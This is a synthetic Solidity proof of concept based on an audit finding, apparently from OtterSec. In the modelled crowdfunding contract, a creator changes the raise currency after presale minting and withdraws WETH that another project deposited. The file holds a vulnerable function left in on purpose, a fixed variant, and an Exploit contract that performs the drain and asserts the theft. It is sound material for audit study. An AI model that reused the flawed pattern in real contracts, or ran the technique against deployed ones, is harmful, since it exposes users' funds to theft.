// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

/*  Entertainmint — a creator retargets raise currency after minting
    (OtterSec / Akash Gurugunti, AuditVault 48439).
    SYNTHETIC, cheatcode-free. Presale already filled 10 units of a
    worthless 18-decimal token. The raise is back in the scheduled gap
    (presale over, public sale not started). updateCurrency switches the
    raise to WETH and withdraw pays raise.balance of that token.
    Another project had deposited 10 WETH. The fair updater, which
    requires timestamp < presaleStart, changes nothing and pays 0 WETH. */

contract Token {
    mapping(address => uint256) public balanceOf;
    address public immutable minter;

    constructor() {
        minter = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "minter");
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
    }
}

contract Raises {
    uint256 public constant GOAL = 10 ether;

    struct Raise {
        address owner;
        address currency;
        uint256 balance;
        uint256 minted;
        uint256 presaleStart;
        uint256 presaleEnd;
        uint256 publicStart;
        bool funded;
    }

    Token public dust;
    Token public weth;
    Raise public attackerRaise;
    uint256 public otherWeth;

    constructor() {
        dust = new Token();
        weth = new Token();
    }

    function fundOther(uint256 amount) external {
        weth.mint(address(this), amount);
        otherWeth += amount;
    }

    function seedFilledPresale(address owner) external {
        attackerRaise = Raise({
            owner: owner,
            currency: address(dust),
            balance: GOAL,
            minted: GOAL,
            presaleStart: 0,
            presaleEnd: 0,
            publicStart: type(uint256).max,
            funded: false
        });
    }

    function scheduled() public view returns (bool) {
        Raise memory r = attackerRaise;
        return block.timestamp < r.presaleStart
            || (block.timestamp >= r.presaleEnd && block.timestamp < r.publicStart);
    }

    function updateCurrency(address next) external {
        require(msg.sender == attackerRaise.owner, "owner");
        require(scheduled(), "scheduled");
        // @> VULN: currency changes after presale tokens were already minted.
        attackerRaise.currency = next;
    }

    function updateCurrencyFixed(address next) external returns (bool) {
        if (block.timestamp >= attackerRaise.presaleStart) return false;
        attackerRaise.currency = next;
        return true;
    }

    function close() external {
        require(msg.sender == attackerRaise.owner, "owner");
        require(attackerRaise.minted >= GOAL, "goal");
        attackerRaise.funded = true;
    }

    function withdraw() external returns (uint256 paid) {
        require(msg.sender == attackerRaise.owner, "owner");
        require(attackerRaise.funded, "funded");
        paid = attackerRaise.balance;
        address currency = attackerRaise.currency;
        attackerRaise.balance = 0;
        Token(currency).transfer(msg.sender, paid);
    }
}

contract Exploit {
    Raises public book;
    Token public weth;
    Token public dust;
    uint256 public taken;
    uint256 public fairWeth;
    bool public fixedApplied;
    uint256 public otherLeft;

    constructor() {
        book = new Raises();
        weth = book.weth();
        dust = book.dust();
        book.fundOther(10 ether);
        book.seedFilledPresale(address(this));
    }

    function run() external {
        require(book.scheduled(), "gap");
        (, address currencyBefore, , uint256 minted, , , , ) = book.attackerRaise();
        require(minted == 10 ether, "presale filled");
        require(currencyBefore == address(dust), "still dust");
        require(weth.balanceOf(address(book)) == 10 ether, "other project deposited");
        book.updateCurrency(address(weth));
        fixedApplied = book.updateCurrencyFixed(address(dust));
        require(!fixedApplied, "fix rejects the gap");
        (, address currencyAfter, , , , , , ) = book.attackerRaise();
        require(currencyAfter == address(weth), "currency is WETH");
        book.close();
        taken = book.withdraw();
        fairWeth = 0;
        otherLeft = weth.balanceOf(address(book));
        require(taken == 10 ether, "withdrew 10 WETH");
        require(otherLeft == 0, "other project lost 10 WETH");
        require(weth.balanceOf(address(this)) == taken, "creator received WETH");
        require(book.otherWeth() == 10 ether, "other project still owed");
    }
}
